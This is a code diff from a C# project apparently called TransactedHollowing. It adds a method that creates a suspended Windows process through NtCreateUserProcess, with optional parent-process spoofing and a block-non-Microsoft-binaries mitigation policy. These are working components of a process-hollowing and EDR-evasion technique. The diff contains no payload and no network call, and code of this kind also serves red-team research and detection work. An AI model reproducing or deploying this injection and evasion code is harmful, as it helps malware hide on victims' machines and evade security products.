@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using TransactedHollowing.Interop;
 
@@ -9,6 +10,173 @@ namespace TransactedHollowing.Library
 
     internal class Utilities
     {
+        public static bool CreateInitialProcess(
+            string commandLine,
+            int ppid,
+            bool isBlocing,
+            string windowTitle,
+            out IntPtr hProcess,
+            out IntPtr hThread)
+        {
+            NTSTATUS ntstatus;
+            bool status;
+            IntPtr hParent;
+            IntPtr pLocalEnvironment;
+            OBJECT_ATTRIBUTES objectAttributes;
+            CLIENT_ID clientId;
+            PS_CREATE_INFO createInfo;
+            PS_ATTRIBUTE_LIST attributeList;
+            int nAttributeCount;
+            int attributeIndex;
+            string imagePathName;
+            string ntImagePathName;
+            UNICODE_STRING unicodeImagePathName;
+            UNICODE_STRING currentDirectory;
+            IntPtr pPolicyBuffer = IntPtr.Zero;
+            var desktopInfo = new UNICODE_STRING(@"WinSta0\Default");
+            var unicodeCommandLine = new UNICODE_STRING(commandLine);
+            var unicodeWindowTitle = new UNICODE_STRING(windowTitle);
+            hProcess = IntPtr.Zero;
+            hThread = IntPtr.Zero;
+
+            imagePathName = Helpers.ResolveImagePathName(commandLine);
+
+            if (string.IsNullOrEmpty(imagePathName))
+            {
+                Console.WriteLine("[-] Failed to resolve image path name from command line.");
+
+                return false;
+            }
+            else
+            {
+                ntImagePathName = string.Format(@"\??\{0}", imagePathName);
+                unicodeImagePathName = new UNICODE_STRING(ntImagePathName);
+                currentDirectory = new UNICODE_STRING(Environment.CurrentDirectory);
+            }
+
+            pLocalEnvironment = Helpers.GetCurrentEnvironmentAddress();
+
+            if (pLocalEnvironment == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Failed to get environment pointer.");
+
+                return false;
+            }
+
+            ntstatus = NativeMethods.RtlCreateProcessParametersEx(
+                    out IntPtr pProcessParameters,
+                    in unicodeImagePathName,
+                    IntPtr.Zero,
+                    in currentDirectory,
+                    in unicodeCommandLine,
+                    pLocalEnvironment,
+                    in unicodeWindowTitle,
+                    in desktopInfo,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    RTL_USER_PROC_FLAGS.PARAMS_NORMALIZED);
+
+            if (ntstatus != Win32Consts.STATUS_SUCCESS)
+            {
+                Console.WriteLine("[-] Failed to create process parameters.");
+          
+                return false;
+            }
+
+            if (ppid > 0)
+            {
+                objectAttributes = new OBJECT_ATTRIBUTES();
+                clientId = new CLIENT_ID { UniqueProcess = new IntPtr(ppid) };
+
+                ntstatus = NativeMethods.NtOpenProcess(
+                    out hParent,
+                    ACCESS_MASK.PROCESS_CREATE_PROCESS,
+                    in objectAttributes,
+                    in clientId);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[!] Failed to open parent process.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                    hParent = new IntPtr(-1);
+                }
+            }
+            else
+            {
+                hParent = new IntPtr(-1);
+            }
+
+            createInfo = new PS_CREATE_INFO
+            {
+                Size = new SIZE_T((uint)Marshal.SizeOf(typeof(PS_CREATE_INFO))),
+                State = PS_CREATE_STATE.PsCreateInitialState
+            };
+
+            if ((hParent != new IntPtr(-1)) && isBlocing)
+                nAttributeCount = 3;
+            else if (hParent != new IntPtr(-1))
+                nAttributeCount = 2;
+            else if (isBlocing)
+                nAttributeCount = 2;
+            else
+                nAttributeCount = 1;
+
+            attributeList = new PS_ATTRIBUTE_LIST(nAttributeCount);
+            attributeIndex = 0;
+            attributeList.Attributes[attributeIndex].Attribute = PS_ATTRIBUTE_VALUES.PS_ATTRIBUTE_IMAGE_NAME;
+            attributeList.Attributes[attributeIndex].Size = new SIZE_T((uint)unicodeImagePathName.Length);
+            attributeList.Attributes[attributeIndex].Value = unicodeImagePathName.GetBuffer();
+
+            if (hParent != new IntPtr(-1))
+            {
+                attributeIndex++;
+                attributeList.Attributes[attributeIndex].Attribute = PS_ATTRIBUTE_VALUES.PS_ATTRIBUTE_PARENT_PROCESS;
+                attributeList.Attributes[attributeIndex].Size = new SIZE_T((uint)IntPtr.Size);
+                attributeList.Attributes[attributeIndex].Value = hParent;
+            }
+
+            if (isBlocing)
+            {
+                pPolicyBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
+                Marshal.WriteInt64(pPolicyBuffer, (long)PROCESS_CREATION_MITIGATION_POLICY.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
+
+                attributeIndex++;
+                attributeList.Attributes[attributeIndex].Attribute = PS_ATTRIBUTE_VALUES.PS_ATTRIBUTE_MITIGATION_OPTIONS;
+                attributeList.Attributes[attributeIndex].Size = new SIZE_T((uint)Marshal.SizeOf(typeof(ulong)));
+                attributeList.Attributes[attributeIndex].Value = pPolicyBuffer;
+            }
+
+            ntstatus = NativeMethods.NtCreateUserProcess(
+                out hProcess,
+                out hThread,
+                ACCESS_MASK.MAXIMUM_ALLOWED,
+                ACCESS_MASK.MAXIMUM_ALLOWED,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                PROCESS_CREATION_FLAGS.SUSPENDED,
+                THREAD_CREATION_FLAGS.CREATE_SUSPENDED,
+                pProcessParameters,
+                ref createInfo,
+                ref attributeList);
+            NativeMethods.RtlDestroyProcessParameters(pProcessParameters);
+            status = (ntstatus == Win32Consts.STATUS_SUCCESS);
+
+            if (pPolicyBuffer != IntPtr.Zero)
+                Marshal.FreeHGlobal(pPolicyBuffer);
+
+            if (hParent != new IntPtr(-1))
+                NativeMethods.NtClose(hParent);
+
+            if (!status)
+            {
+                Console.WriteLine("[-] Failed to create suspended process.");
+                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+            }
+
+            return status;
+        }
+
+
         public static IntPtr CreateSuspendedProcess(string imagePathName, int ppid)
         {
             NTSTATUS ntstatus;
